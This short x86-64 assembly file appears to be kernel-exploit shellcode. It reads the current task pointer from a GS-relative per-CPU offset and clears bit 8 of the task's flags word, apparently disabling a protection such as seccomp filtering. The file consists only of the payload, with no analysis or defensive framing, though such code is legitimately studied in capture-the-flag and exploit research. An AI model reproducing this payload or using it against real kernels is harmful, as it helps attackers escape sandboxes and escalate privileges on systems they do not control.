.global _start
.intel_syntax noprefix
_start:
    mov rbx, qword ptr gs:0x15d00
    and qword ptr [rbx], 0xfffffffffffffeff
    ret
